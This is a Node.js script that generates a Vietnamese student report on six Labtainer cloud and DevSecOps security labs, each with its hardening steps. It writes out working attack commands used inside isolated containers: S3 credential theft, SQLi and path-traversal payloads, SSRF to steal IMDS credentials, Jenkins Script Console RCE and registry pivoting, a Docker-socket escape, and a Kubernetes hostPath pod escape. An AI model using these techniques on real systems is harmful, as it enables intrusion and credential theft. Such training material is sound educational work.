// Bao cao TONG HOP lab 5-10 (1 file): anh moi (tim, sac net), ma SV le=202/chan=190, co imodule.
const path = require('path');
const { render, makeC } = require('./engine');
const { C, h1, h2, h3, p, b, code, img, table } = makeC();

const VM = '192.168.17.144';
const NAM = 'Lê Thành Nam - B22DCAT202';   // bai LE (5,7,9)
const MINH = 'Nguyễn Hồng Minh - B22DCAT190'; // bai CHAN (6,8,10)
const IM = 'https://github.com/namlt04/do-an-2026/raw/refs/heads/master/imodule';
const startBlock = (lab) => { h3('Khởi động bài lab'); code(`imodule ${IM}/${lab}.tar\nlabtainer ${lab}`); };

h1('TỔNG QUAN');
h2('Mục tiêu');
p('Báo cáo tổng hợp sáu bài thực hành (bài 5 đến bài 10) trên môi trường Labtainer. Với mỗi bài, sinh viên đóng vai người làm bài từ đầu đến cuối: cài bài bằng `imodule`, khởi động bằng `labtainer`, lần lượt chạy đúng từng dòng lệnh trong hướng dẫn, lấy flag và chấm điểm tự động bằng `checkwork`. Toàn bộ quá trình được chụp ảnh màn hình làm minh chứng.');
h2('Phân công thực hiện');
table(['STT', 'Bài thực hành', 'Mã lab', 'Người thực hiện'], [700, 3700, 2000, 3068], [
  ['5', 'Khai thác cấu hình sai Object Storage (S3)', 'cloud-s3-misconfig', NAM],
  ['6', 'Triển khai WAF Coraza + OWASP CRS', 'dso-waf-crs', MINH],
  ['7', 'SSRF truy cập Instance Metadata (IMDS)', 'cloud-ssrf-imds', NAM],
  ['8', 'Khai thác CI/CD Jenkins & pivot Registry', 'dso-cicd-jenkins', MINH],
  ['9', 'Thoát container qua Docker socket', 'dso-docker-escape', NAM],
  ['10', 'Leo thang đặc quyền Kubernetes RBAC', 'cloud-k8s-rbac', MINH],
]);
h2('Môi trường thực hiện');
b('Máy ảo Labtainer (VMware): Ubuntu, Docker; các bài lab chạy trong các container cô lập, offline khi làm bài.',
  `Truy cập giao diện đồ họa của máy ảo trực tiếp trên trình duyệt web qua noVNC (cổng 6080, \`http://${VM}:6080/vnc.html\`).`,
  'Mỗi sinh viên khởi động lab bằng mã sinh viên riêng; Labtainer dùng giá trị này để sinh flag/khóa cá thể hóa (HASH_REPLACE) nên flag mỗi người khác nhau.');

// ================= LAB 5 =================
h1('BÀI THỰC HÀNH 5: KHAI THÁC CẤU HÌNH SAI OBJECT STORAGE (CLOUD-S3-MISCONFIG)');
p('Người thực hiện: ' + NAM + ' (mã khởi động lab: b22dcat202).');
h2('Mục đích');
b('Nhận diện cấu hình sai kinh điển của object storage: bucket cho phép truy cập ẩn danh (anonymous read), để lộ dữ liệu nhạy cảm.',
  'Trích xuất credential bị lộ từ file backup trong bucket công khai, dùng nó để truy cập bucket riêng và lấy flag (khái niệm blast radius).',
  'Khắc phục theo vai DevSecOps: gỡ policy công khai (đưa bucket về private), bật versioning để bảo vệ dữ liệu (MITRE T1530).');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `aws-cli`, `jq`; có file `~/hardening-admin.env` chứa credential quản trị cấp sẵn cho nhiệm vụ hardening.',
  'Container `storage` (không có terminal, 172.33.0.30:9000): object storage MinIO với bucket `public-assets` (cấu hình sai: cho anonymous read) và bucket riêng `secure-data` chứa flag.',
  'Toàn bộ tương tác qua giao thức S3 (endpoint-url tới MinIO), offline.');
h2('Nội dung thực hành');
startBlock('cloud-s3-misconfig');
img('l5_01_start.png', 'Khởi động bài lab cloud-s3-misconfig và mở terminal container client');
h3('Nhiệm vụ 1 - Trinh sát truy cập ẩn danh');
code('aws --endpoint-url http://172.33.0.30:9000 s3 ls s3://public-assets --recursive --no-sign-request');
img('l5_02_recon.png', 'Liệt kê ẩn danh bucket public-assets thành công (LISTED) - cấu hình sai');
h3('Nhiệm vụ 2 - Trích xuất backup và tìm credential lộ');
code('aws --endpoint-url http://172.33.0.30:9000 s3 cp s3://public-assets/backup/app-backup-20250811.tar.gz ~/loot/ --no-sign-request\ntar -xzf ~/loot/app-backup-20250811.tar.gz -C ~/loot/\ngrep -E "ACCESS_KEY|SECRET" ~/loot/app-config.env');
img('l5_03_creds.png', 'Tải & giải nén backup, trích được access key/secret key lộ trong app-config.env');
h3('Nhiệm vụ 3 - Dùng credential lộ lấy flag');
code('export AWS_ACCESS_KEY_ID=$(cat ~/creds_access_key.txt)\nexport AWS_SECRET_ACCESS_KEY=$(cat ~/creds_secret_key.txt)\naws --endpoint-url http://172.33.0.30:9000 s3 cp s3://secure-data/confidential/flag.txt ~/loot.txt\ncat ~/loot.txt');
img('l5_04_flag.png', 'Dùng credential lộ truy cập bucket riêng secure-data, lấy flag (giá trị hiển thị trong ảnh)');
h3('Nhiệm vụ 4 - Khắc phục cấu hình sai');
p('Nạp credential quản trị cấp sẵn, gỡ bucket policy công khai (đưa về private) và bật versioning cho bucket riêng:');
code('aws --endpoint-url http://172.33.0.30:9000 s3api delete-bucket-policy --bucket public-assets\naws --endpoint-url http://172.33.0.30:9000 s3api put-bucket-versioning --bucket secure-data --versioning-configuration Status=Enabled');
img('l5_05_harden.png', 'Sau hardening: truy cập ẩn danh bị từ chối (DENIED), versioning secure-data = ENABLED');
h2('Kết quả thực hiện');
img('l5_06_checkwork.png', 'Kết quả chấm điểm tự động bài cloud-s3-misconfig: 5/5 mục tiêu đạt (Y), sinh viên b22dcat202');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['enum_anonymous', 'Liệt kê bucket công khai ẩn danh', 'Y'],
  ['exfiltrate_backup', 'Trích credential từ backup', 'Y'],
  ['access_secure_bucket', 'Dùng credential lấy flag', 'Y'],
  ['harden_public_denied', 'Chặn truy cập ẩn danh', 'Y'],
  ['harden_versioning_enabled', 'Bật versioning bucket riêng', 'Y'],
]);
p('Kết quả: hoàn thành 5/5 mục tiêu.');

// ================= LAB 6 =================
h1('BÀI THỰC HÀNH 6: TRIỂN KHAI WAF CORAZA + OWASP CRS (DSO-WAF-CRS)');
p('Người thực hiện: ' + MINH + ' (mã khởi động lab: b22dcat190).');
h2('Mục đích');
b('Hiểu cơ chế WAF Coraza + OWASP Core Rule Set: rule, anomaly scoring, paranoia level, chế độ Detection vs Blocking.',
  'Chứng minh ứng dụng không có WAF dễ bị SQLi/XSS/path traversal; sau đó bật WAF chặn các tấn công đó (trả 403).',
  'Đánh giá hiệu quả WAF bằng DAST (nikto) trước/sau; và khử false positive bằng rule exclusion khoanh vùng mà không mở lại lỗ hổng.');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `curl`, `nikto`.',
  'Container `webapp` (không có terminal, 172.38.0.30:8080): ứng dụng web có lỗ hổng, truy cập trực tiếp không qua WAF.',
  'Container `waf` (có terminal, 172.38.0.20): reverse proxy Caddy + Coraza v3 + OWASP CRS; nơi cấu hình SecRuleEngine và rule exclusion; sinh audit log JSON.');
h2('Nội dung thực hành');
startBlock('dso-waf-crs');
img('l6_01_start.png', 'Khởi động bài lab dso-waf-crs (mở terminal client và waf)');
h3('Nhiệm vụ 1 - Khai thác ứng dụng trực tiếp (không WAF)');
code('curl -s -i "http://172.38.0.30:8080/product?id=1\'%20OR%20\'1\'=\'1"\ncurl -s "http://172.38.0.30:8080/download?file=../../../../flag1.txt" | tee ~/flag1.txt');
img('l6_02_direct.png', 'Tấn công trực tiếp backend (SQLi HTTP 200, path traversal) lấy Flag 1');
h3('Nhiệm vụ 2 - Bật Coraza blocking, tấn công bị 403, lấy Flag 2');
p('Chuyển `SecRuleEngine` sang `On`, khởi động lại Caddy; gửi lại các payload tấn công qua WAF (172.38.0.20):');
code('curl -s -o /dev/null -w "%{http_code}" "http://172.38.0.20/product?id=1\'%20OR%20\'1\'=\'1"\ncurl -s http://172.38.0.20/flag2 | tee ~/flag2.txt');
img('l6_03_waf403.png', 'Sau khi bật WAF: SQLi/traversal/XSS đều trả 403; lấy Flag 2');
h3('Nhiệm vụ 3 - Đánh giá bằng DAST trước/sau WAF');
code('nikto -h http://172.38.0.30:8080 -o ~/dast_noWAF.txt -Format txt\nnikto -h http://172.38.0.20 -o ~/dast_WAF.txt -Format txt\ngrep -c \'^+ \' ~/dast_noWAF.txt; grep -c \'^+ \' ~/dast_WAF.txt');
img('l6_04_dast.png', 'So sánh DAST: số cảnh báo khi quét qua WAF giảm so với quét trực tiếp');
h3('Nhiệm vụ 4 - Khử false positive bằng rule exclusion, lấy Flag 3');
p('Một request hợp lệ tới `/feedback` (chứa từ khóa giống SQLi) bị chặn nhầm. Viết exclusion khoanh vùng (chỉ loại rule đó cho tham số `comment` trên `/feedback`), sau đó lấy Flag 3:');
code('curl -s http://172.38.0.20/flag3 | tee ~/flag3.txt');
img('l6_05_exclusion.png', 'Exclusion khoanh vùng: feedback hợp lệ trả 200, XSS/SQLi vẫn 403, lấy Flag 3');
h2('Kết quả thực hiện');
img('l6_06_checkwork.png', 'Kết quả chấm điểm tự động bài dso-waf-crs: 4/4 mục tiêu đạt (Y), sinh viên b22dcat190');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['exploit_direct', 'Khai thác backend trực tiếp (Flag 1)', 'Y'],
  ['deploy_waf', 'Bật Coraza blocking, 403 (Flag 2)', 'Y'],
  ['dast_compare', 'DAST trước/sau WAF', 'Y'],
  ['tune_falsepositive', 'Exclusion khoanh vùng (Flag 3)', 'Y'],
]);
p('Kết quả: hoàn thành 4/4 mục tiêu.');

// ================= LAB 7 =================
h1('BÀI THỰC HÀNH 7: SSRF TRUY CẬP INSTANCE METADATA (CLOUD-SSRF-IMDS)');
p('Người thực hiện: ' + NAM + ' (mã khởi động lab: b22dcat202).');
h2('Mục đích');
b('Hiểu lỗ hổng SSRF: ép máy chủ web gửi request tới dịch vụ nội bộ mà attacker không truy cập trực tiếp được.',
  'Khai thác SSRF để truy cập Instance Metadata Service (IMDS) và đánh cắp credential tạm thời của IAM role (MITRE T1552.005).',
  'Dùng credential đánh cắp để truy cập object storage lấy flag; sau đó khắc phục nhiều lớp: bật IMDSv2, allowlist trên webapp, least privilege.');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `curl`, `aws-cli`, `jq`.',
  'Container `web` (không có terminal): ứng dụng có endpoint `/fetch?url=` dính SSRF.',
  'Container `imds` (mô phỏng IMDS cấp credential tạm thời role `web-imgproxy-role`) và container `storage` (MinIO) chứa flag trong bucket `fin-reports`.');
h2('Nội dung thực hành');
startBlock('cloud-ssrf-imds');
img('l7_01_start.png', 'Khởi động bài lab cloud-ssrf-imds và mở terminal container client');
h3('Nhiệm vụ 1 & 2 - Phát hiện SSRF và đánh cắp credential IMDS');
code('curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"\nROLE=$(curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/")\ncurl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/iam/security-credentials/$ROLE" | tee ~/creds.txt');
img('l7_02_ssrf.png', 'SSRF truy cập IMDS, đánh cắp credential tạm thời của role web-imgproxy-role');
h3('Nhiệm vụ 3 - Dùng credential đánh cắp lấy flag từ storage');
code('export AWS_ACCESS_KEY_ID=...; export AWS_SECRET_ACCESS_KEY=...\nunset AWS_SESSION_TOKEN; export AWS_DEFAULT_REGION=us-east-1\naws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ~/loot.txt\ncat ~/loot.txt');
img('l7_03_flag.png', 'Dùng credential IMDS đánh cắp truy cập bucket fin-reports, lấy flag (giá trị trong ảnh)');
h3('Nhiệm vụ 4 - Khắc phục nhiều lớp (IMDSv2, allowlist, least privilege)');
code('curl -s -X POST http://imds/admin/enable-imdsv2\ncurl -s -X POST http://web:8080/admin/harden\ncurl -s -o /dev/null -w "%{http_code}" "http://web:8080/fetch?url=http://imds/latest/meta-data/"');
img('l7_04_harden.png', 'Sau hardening: SSRF GET không còn credential (IMDSv2), request tới imds bị chặn 403 (allowlist)');
h2('Kết quả thực hiện');
img('l7_05_checkwork.png', 'Kết quả chấm điểm tự động bài cloud-ssrf-imds: 4/4 mục tiêu đạt (Y), sinh viên b22dcat202');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['g_discover_ssrf', 'Phát hiện SSRF tới mục tiêu nội bộ', 'Y'],
  ['g_steal_credentials', 'Đánh cắp credential IMDS qua SSRF', 'Y'],
  ['g_access_storage_get_flag', 'Dùng credential lấy flag', 'Y'],
  ['g_harden_ssrf_imds', 'Khắc phục: IMDSv2 + allowlist', 'Y'],
]);
p('Kết quả: hoàn thành 4/4 mục tiêu.');

// ================= LAB 8 =================
h1('BÀI THỰC HÀNH 8: KHAI THÁC CI/CD JENKINS & PIVOT REGISTRY (DSO-CICD-JENKINS)');
p('Người thực hiện: ' + MINH + ' (mã khởi động lab: b22dcat190).');
h2('Mục đích');
b('Nhận diện Jenkins cấu hình sai (cho phép truy cập ẩn danh, Script Console mở) - tương đương RCE toàn quyền trên máy CI.',
  'Khai thác Script Console để thực thi Groovy, đọc flag và thu thập credential registry lộ trong log build.',
  'Pivot: dùng credential đánh cắp xác thực vào Docker Registry nội bộ, tải layer image và trích flag (MITRE T1078); sau đó hardening Jenkins.');
h2('Môi trường bài lab');
b('Container `client` (có terminal): máy attacker, cài sẵn `curl`, `jq`, `tar`.',
  'Container `jenkins` (không có terminal): Jenkins LTS thật, cấu hình sai cho phép anonymous + Script Console; job `build-app`.',
  'Container `registry` (không có terminal, 5000): Docker Registry v2 nội bộ, image `acme/app` chứa flag trong layer; credential `deployer` lộ trong log build.');
h2('Nội dung thực hành');
startBlock('dso-cicd-jenkins');
img('l8_01_start.png', 'Khởi động bài lab dso-cicd-jenkins và mở terminal container client');
h3('Nhiệm vụ 1 & 2 - Trinh sát Jenkins và RCE Script Console');
code('curl -s -D - -o /dev/null http://jenkins:8080/ | grep -i X-Jenkins\ncurl -s --data-urlencode \'script=println new File("/var/jenkins_home/flag_ci.txt").text\' http://jenkins:8080/scriptText | tee ~/flag_ci.txt');
img('l8_02_rce.png', 'Jenkins, Script Console RCE, đọc flag_ci (giá trị trong ảnh)');
h3('Nhiệm vụ 3 - Thu thập credential registry từ log build');
code('curl -s "http://jenkins:8080/job/build-app/lastBuild/consoleText" | tee ~/buildlog.txt | grep -Ei \'deployer\'');
img('l8_03_creds.png', 'Trích mật khẩu registry (deployer) lộ trong console log của job build-app');
h3('Nhiệm vụ 4 - Pivot vào Docker Registry, trích flag từ layer');
code('RP=$(cat ~/regpass_loot.txt)\nMAN=$(curl -s -u "deployer:$RP" -H \'Accept: application/vnd.docker.distribution.manifest.v2+json\' http://registry:5000/v2/acme/app/manifests/1.0)\nDIG=$(echo "$MAN" | grep -o \'sha256:[0-9a-f]\\{64\\}\' | tail -1)\ncurl -s -u "deployer:$RP" "http://registry:5000/v2/acme/app/blobs/$DIG" -o ~/layer.tar\ntar -xzf ~/layer.tar && cat ~/flag_pivot.txt');
img('l8_04_pivot.png', 'Pivot vào registry bằng credential đánh cắp, tải layer, trích flag_pivot (giá trị trong ảnh)');
h3('Nhiệm vụ 5 - Hardening Jenkins');
p('Dùng chính quyền RCE để bật xác thực và thu hồi quyền của người dùng ẩn danh:');
code('curl -s -o /dev/null -w "%{http_code}" http://jenkins:8080/api/json   # ky vong 403 sau hardening');
img('l8_05_harden.png', 'Sau hardening: truy cập API và Script Console ẩn danh trả 403');
h2('Kết quả thực hiện');
img('l8_06_checkwork.png', 'Kết quả chấm điểm tự động bài dso-cicd-jenkins: 5/5 mục tiêu đạt (Y), sinh viên b22dcat190');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['recon_jenkins', 'Trinh sát Jenkins (X-Jenkins, job)', 'Y'],
  ['rce_script_console', 'RCE qua Script Console (flag_ci)', 'Y'],
  ['harvest_creds', 'Thu thập credential registry', 'Y'],
  ['pivot_registry', 'Pivot registry, trích flag_pivot', 'Y'],
  ['harden_jenkins', 'Bật xác thực, chặn ẩn danh', 'Y'],
]);
p('Kết quả: hoàn thành 5/5 mục tiêu.');

// ================= LAB 9 =================
h1('BÀI THỰC HÀNH 9: THOÁT CONTAINER QUA DOCKER SOCKET (DSO-DOCKER-ESCAPE)');
p('Người thực hiện: ' + NAM + ' (mã khởi động lab: b22dcat202).');
h2('Mục đích');
b('Hiểu rủi ro khi mount `/var/run/docker.sock` vào container: tương đương quyền root trên host (MITRE T1611 - Escape to Host).',
  'Trinh sát dấu hiệu cấu hình sai (docker.sock lộ, capability dư thừa, block device) rồi lợi dụng socket điều khiển Docker daemon host tạo container mount toàn bộ rootfs host.',
  'Đọc flag trên host qua container thoát; sau đó hardening cấu hình chạy container theo CIS Docker Benchmark.');
h2('Môi trường bài lab');
b('Container `app` (có terminal): container ứng dụng bị cấu hình sai - mount `/var/run/docker.sock`; cài sẵn `docker` client.',
  'Container `host-sim` (không có terminal): mô phỏng host chạy Docker daemon (Docker-in-Docker), chứa flag tại `/root/flag.txt` và canary `/root/.hostmarker`.',
  'Trên daemon host-sim có sẵn image tối giản `escimg` để tạo container thoát (offline).');
h2('Nội dung thực hành');
startBlock('dso-docker-escape');
img('l9_01_start.png', 'Khởi động bài lab dso-docker-escape và mở terminal container app');
h3('Nhiệm vụ 1 - Trinh sát container');
code('grep -i cap /proc/self/status\nls -la /var/run/docker.sock');
img('l9_02_recon.png', 'Trinh sát: phát hiện /var/run/docker.sock bị lộ (dấu hiệu cấu hình sai)');
h3('Nhiệm vụ 2 - Thoát container qua Docker socket');
p('Dùng socket lộ để ra lệnh cho Docker daemon host tạo container mới mount toàn bộ rootfs host (`/` → `/host`), rồi trích canary và flag bằng `docker cp`:');
code('docker -H unix:///var/run/docker.sock run -d --name esc -v /:/host escimg sleep 300\ndocker -H unix:///var/run/docker.sock cp esc:/host/root/.hostmarker ~/host_evidence.txt\ndocker -H unix:///var/run/docker.sock cp esc:/host/root/flag.txt ~/flag_result.txt');
img('l9_03_escape.png', 'Thoát container qua socket, đọc canary host và flag (giá trị trong ảnh)');
h3('Nhiệm vụ 3 - Hardening cấu hình container');
p('Viết lại lệnh chạy container an toàn (bỏ mount socket, bỏ privileged, cap-drop ALL, no-new-privileges, user không phải root, read-only) và lập bảng đối chiếu với CIS Docker Benchmark:');
code('docker run -d --name app --cap-drop=ALL --security-opt=no-new-privileges \\\n  --user 10001:10001 --read-only --pids-limit 128 --memory=256m app:student\n# KHONG --privileged, KHONG mount -v /var/run/docker.sock');
img('l9_04_harden.png', 'hardened_run.sh: cap-drop=ALL, không mount docker.sock; bảng ánh xạ CIS');
h2('Kết quả thực hiện');
img('l9_05_checkwork.png', 'Kết quả chấm điểm tự động bài dso-docker-escape: các mục tiêu đạt (Y), sinh viên b22dcat202');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['recon_container', 'Trinh sát container tìm cấu hình sai', 'Y'],
  ['escape_via_socket', 'Thoát qua Docker socket bị lộ', 'Y'],
  ['get_flag', 'Đọc flag trên host', 'Y'],
  ['harden_container', 'Hardening cấu hình container', 'Y'],
]);
p('Kết quả: hoàn thành toàn bộ mục tiêu.');

// ================= LAB 10 =================
h1('BÀI THỰC HÀNH 10: LEO THANG ĐẶC QUYỀN KUBERNETES RBAC (CLOUD-K8S-RBAC)');
p('Người thực hiện: ' + MINH + ' (mã khởi động lab: b22dcat190).');
h2('Mục đích');
b('Hiểu RBAC Kubernetes: ServiceAccount token, quyền (verbs/resources), và rủi ro khi cấp quyền quá rộng.',
  'Trinh sát quyền của ServiceAccount bị chiếm, moi secret và phát hiện secret để lẫn trong ConfigMap (anti-pattern); dùng quyền tạo pod để thoát ra node qua hostPath.',
  'Khắc phục theo least privilege: thay role quá rộng bằng role tối thiểu và bật Pod Security Standards (restricted).');
h2('Môi trường bài lab');
b('Container `attacker` (có terminal): có `kubectl` và kubeconfig của ServiceAccount bị chiếm (quyền quá rộng) cùng kubeconfig admin cấp sẵn cho hardening.',
  'Container `k8s-node` (không có terminal): một node Kubernetes thật (k3s) chạy bằng systemd; namespace `app` chứa secret `db-credentials`, ConfigMap `app-config` (lẫn secret), và flag trên host tại `/opt/host-secrets/flag.txt`.');
h2('Nội dung thực hành');
startBlock('cloud-k8s-rbac');
img('l10_01_start.png', 'Khởi động bài lab cloud-k8s-rbac (node k3s Ready) và mở terminal container attacker');
h3('Nhiệm vụ 1 & 2 - Trinh sát RBAC và moi secret');
code('kubectl auth can-i list secrets -n app\nkubectl auth can-i create pods -n app\nkubectl get secret db-credentials -n app -o jsonpath=\'{.data.password}\' | base64 -d\nkubectl get configmap app-config -n app -o yaml | grep -iE \'legacy_api_key\'');
img('l10_02_loot.png', 'ServiceAccount có quyền list secrets/create pods; moi được password và legacy_api_key lẫn trong ConfigMap');
h3('Nhiệm vụ 3 - Thoát ra node qua hostPath pod');
p('Dùng quyền tạo pod để triển khai pod mount `/` của node qua hostPath, rồi đọc flag trên host:');
code('kubectl apply -f /tmp/escape.yaml   # pod maintenance-shell mount hostPath / -> /host\nkubectl exec maintenance-shell -n app -- cat /host/opt/host-secrets/flag.txt | tee ~/flag.txt');
img('l10_03_escape.png', 'Pod hostPath thoát ra node, đọc flag host (giá trị trong ảnh)');
h3('Nhiệm vụ 4 - Khắc phục theo least privilege');
p('Dùng kubeconfig admin thay role quá rộng bằng role tối thiểu và bật Pod Security Standards mức restricted; kiểm chứng ServiceAccount không còn quyền:');
code('export KUBECONFIG=~/.kube/admin-config\nkubectl apply -f /tmp/least-priv-role.yaml\nkubectl label ns app pod-security.kubernetes.io/enforce=restricted --overwrite\nexport KUBECONFIG=~/.kube/config\nkubectl auth can-i list secrets -n app   # ky vong: no');
img('l10_04_harden.png', 'Sau hardening: ServiceAccount không còn quyền list secrets / create pods (no)');
h2('Kết quả thực hiện');
img('l10_05_checkwork.png', 'Kết quả chấm điểm tự động bài cloud-k8s-rbac: 4/4 mục tiêu đạt (Y), sinh viên b22dcat190');
table(['Mục tiêu (goal)', 'Nội dung', 'KQ'], [3200, 4800, 900], [
  ['recon_rbac', 'Trinh sát quyền RBAC của ServiceAccount', 'Y'],
  ['loot_secrets', 'Moi secret & secret trong ConfigMap', 'Y'],
  ['escape_node', 'Thoát ra node qua hostPath pod', 'Y'],
  ['harden_cluster', 'Least privilege + Pod Security', 'Y'],
]);
p('Kết quả: hoàn thành 4/4 mục tiêu.');

// ================= KET LUAN =================
h1('KẾT LUẬN');
h2('Kết quả đạt được');
b('Hoàn thành sáu bài thực hành 5-10, mỗi bài chấm điểm tự động bằng `checkwork` đạt toàn bộ mục tiêu (Y).',
  'Bài lẻ (5, 7, 9) do Lê Thành Nam (B22DCAT202) thực hiện; bài chẵn (6, 8, 10) do Nguyễn Hồng Minh (B22DCAT190) thực hiện; flag sinh riêng theo mã sinh viên.',
  'Các bài bao quát: object storage cấu hình sai, WAF (Coraza + OWASP CRS), SSRF/IMDS, bảo mật CI/CD (Jenkins) và pivot registry, thoát container qua Docker socket, và leo thang đặc quyền Kubernetes RBAC.',
  'Mỗi bài đều thực hiện bằng cách sao chép đúng từng dòng lệnh trong hướng dẫn (bắt đầu bằng `imodule` để cài bài), xác nhận hướng dẫn chạy đúng và bài lab thực sự làm được.');

render(C, {
  imgDir: path.join(__dirname, 'anh-tonghop'),
  out: path.join(__dirname, '..', 'Bao-cao-tong-hop-lab-5-10.docx'),
}).catch(e => { console.error(e); process.exit(1); });
